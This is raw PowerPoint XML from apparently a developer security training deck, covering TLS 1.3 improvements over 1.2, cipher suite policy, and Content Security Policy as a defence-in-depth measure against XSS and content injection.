        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="171302590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FC79-256C-2F01-2DC8-7BB395621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BA5C6-3987-1241-425F-831F8C66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7C108-0AD5-7EB1-9AB6-6A346461800D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Even if configured well, TLS 1.2 has some </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" err="1">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>issus</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> that are addressed or fixed in 1.3</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C8970673-C04A-8F35-A874-B4ED02EB281C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>151</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="403482672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F2771-EAD3-A181-0B74-A9A1297EB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43005-5ED4-8DB6-D8CA-9523EDCF5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3A733-4B74-BB1A-D41D-08089431B231}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>TLS 1.3 is a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>major protocol redesign</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, not just a tweak. It explicitly obsoletes the TLS 1.2 spec, streamlines handshake procedures, mandates forward secrecy, and eliminates lots of legacy baggage from old versions</a:t>
            </a:r>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D037676E-644C-9855-3A1A-CCFD564DB3AD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>152</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="225600539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1EB78-1183-122A-DE2A-71A0F1460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19AA1-014C-76A1-2351-D875725E8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33853-0527-D91E-AD1A-1455D4760964}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>y simplifying the state machine and eliminating these legacy paths, TLS 1.3 effectively “bakes in” mitigations against many classes of attacks that plagued SSL/TLS for 20+ years</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8B2CFCDE-7CA3-91B0-5C14-D6172333A31C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>153</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="34590636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C8880-397E-87E4-2FFB-C26577973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98B72-7F27-5230-32AE-D4929B68E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89FB8-D1CC-E472-68F9-682F647970D9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>As a senior dev, you don’t have to memorize every suite string, but you should be able to say:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>“We allow TLS 1.3 and strong AEAD cipher suites only.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0">
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> We don’t support legacy protocols or RSA key exchange unless there’s a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>very</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> good reason.”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{16D9C4EB-399D-7E11-DE1A-3430E30D8C48}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>154</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="376661144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2C991-BC0A-85EC-6C22-D6DDDA1F7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D7D30-649D-DB58-2F46-73BF8C614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68043-DB2A-59CB-5D2F-B3D890386D87}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>As a senior dev, you don’t have to memorize every suite string, but you should be able to say:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>“We allow TLS 1.3 and strong AEAD cipher suites only.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0">
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> We don’t support legacy protocols or RSA key exchange unless there’s a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>very</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> good reason.”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EFB102AF-E03F-4494-BC2F-F986A08B94B7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>155</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="290539646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81F3-1E04-209D-7845-308BDF03A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0FF8-43FE-9E4D-8C74-2FCC95242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754BC-AA0D-18DA-B62B-38829DD7F8A9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Modern attacks like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Cross-Site Scripting (XSS)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>data injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> usually work by tricking the browser into running untrusted code (e.g., &lt;script&gt; injected via user input).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>CSP tells the browser 'If content doesn’t come from an allowed source (per my CSP policy), then block it.'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>This is a great defense against</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> XSS and content injection bugs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> because even if our HTML has an injection point, a malicious script will because its source is blocked by CSP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{24BEB994-5296-FFCA-CEE3-D9070CAD8498}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>157</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="300791354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5518E-D8A1-DA68-59D8-3B8908B8F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3574A-7F26-188B-465D-727C9259E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BA152-CB91-715C-E623-DBA03EEF01BC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Anything </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>not</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> on the list: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>blocked by default</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Configured server-side via:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="Calibri" panose="020F0502020204030204"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204"/>
              </a:rPr>
              <a:t>Webserver/reverse proxy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="Calibri" panose="020F0502020204030204"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204"/>
              </a:rPr>
              <a:t>Application/middleware - express, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:ea typeface="Calibri" panose="020F0502020204030204"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204"/>
              </a:rPr>
              <a:t>django</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="Calibri" panose="020F0502020204030204"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
          </a:p>
          <a:p>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20981A9-ECEC-4D16-F331-94A11D372A32}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>158</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="343952320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C4A19-FCA2-F07D-CF51-16CE07642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266FD-C561-AB8A-7653-35BE12C13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C9286-9339-2C70-4404-86A3E224CB68}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>CSP is a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" i="1" dirty="0"/>
              <a:t>defense-in-depth</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> measure, not a replacement for escaping, sanitization, or parameterized queries.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> You still must fix the root causes (unescaped output, unsafe eval, etc.), but CSP gives you a powerful “last line of defense.”</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E5A19DD0-E133-F922-EF29-C49560D57215}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>159</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="221108377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8576-2F2B-C485-AD30-CE54A5850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DE778-B43B-ABA7-4C68-152B62D86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6614E-5200-E2C1-BC91-474C1550E7B6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>CSP is a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" i="1" dirty="0"/>
              <a:t>defense-in-depth</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> measure, not a replacement for escaping, sanitization, or parameterized queries.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> You still must fix the root causes (unescaped output, unsafe eval, etc.), but CSP gives you a powerful “last line of defense.”</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{02E3FE8F-5AFC-AA33-9F1E-2ECC7354DBEC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>160</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="387852156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3E7E6-AF78-3502-95B2-356113F50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2AC85-118D-2FAC-98D4-1372EAF50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60F42-4BDB-C715-BEAC-C84D196C4511}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Let’s take a look at the configurations you’ll use most.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>This one is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>a “catch-all” fallback if a more specific source isn’t set.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{53A0E6D3-EC89-F342-A255-20F761F11112}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>161</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="248154534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97B6-3740-0B0D-B0A0-1E347DC36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5F41A-1625-8451-DF51-701A0F199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E2337-0695-5F96-B5B9-2DF7250728D2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>This means:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Scripts allowed only from the same origin and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://cdn.example.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Inline scripts &amp; eval() are blocked by default (unless you explicitly add 'unsafe-inline' or 'unsafe-eval', which you usually should </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>avoid</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3EBE4BA2-F0BD-8F1B-3846-2B4889146B7D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
